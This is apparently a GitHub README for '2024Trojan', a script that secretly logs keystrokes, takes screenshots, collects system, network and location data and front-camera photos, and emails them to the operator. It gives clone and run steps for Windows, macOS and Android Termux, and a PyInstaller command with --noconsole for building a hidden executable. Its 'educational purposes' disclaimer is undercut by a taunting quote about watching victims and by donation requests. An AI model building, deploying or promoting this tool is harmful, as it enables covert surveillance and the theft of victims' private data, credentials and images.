# Trojan 2024: A Multi-Platform Information Gathering Script

Welcome! This repository provides a script that captures screenshots, logs keystrokes, gathers hardware and network information, fetches the current location, and captures images from the front camera—all delivered securely via email.

## Key Features
1. **Screenshot and Keylogging**: Captures activity every 60 seconds.
2. **Hardware and Network Data**: Gathers system and network details.
3. **Location Tracking**: Retrieves the approximate geographic location.
4. **Front Camera Capture**: Captures an image using the front camera.

## Usage Instructions
### Windows
1. Clone the repository:
   git clone https://github.com/BlackNode-stack/2024Trojan.git
   cd 2024Trojan
   
   pip install -r requirements.txt
   Run the script:
   python Run.py
   
 To create an executable .
   pyinstaller --onefile --noconsole --hidden-import=requests --hidden-import=bs4 --hidden-import=email --hidden-import=cv2 --hidden-import=PIL --hidden-import=pynput --hidden-import=colorama Run.py
   ```
   The executable will be located in the `dist` folder.

### macOS
1. Clone the repository:
   git clone https://github.com/BlackNode-stack/2024Trojan.git
   cd 2024Trojan
  
   python3 -m pip install -r requirements.txt
   python3 Run.py
   
 To create an executable .
   
   pyinstaller --onefile --noconsole --hidden-import=requests --hidden-import=bs4 --hidden-import=email --hidden-import=cv2 --hidden-import=PIL --hidden-import=pynput --hidden-import=colorama Run.py
   ```
   The executable will be located in the `dist` folder.

### Termux (Android)
1. Update and install required packages:
   pkg update && pkg upgrade
   pkg install git python
   
   git clone https://github.com/BlackNode-stack/2024Trojan.git
   cd 2024Trojan
   pip install -r requirements.txt
   
   python Run.py
   

## Important Notes
1. **Email Setup**: The script requires a sender email and password (use an [App Password](https://myaccount.google.com/apppasswords) for security).
2. **Legal Use Only**: This project is strictly for educational purposes. Unauthorized use is illegal and unethical.
3. **Contribution and Customization**: If you need custom scripts or want to join a team of programmers and ethical hackers, reach out!

## Support Me
If you find this script helpful or want more tools like this, consider supporting me:
- **Bitcoin**: `bc1q3kqdczj6q780y642yq9dvvfuk43g5a5uxn83f2`
- **Ethereum**: `0xE8e903eE127113c30aFd52acbDbdB567968534Ea`

---
**Disclaimer**: "Your defenses are paper walls against my storm. Every keystroke whispers your secrets; every shadow hides my trace. By the time you notice, I'll already be gone... or maybe I’ll just be watching." Use responsibly and ethically.

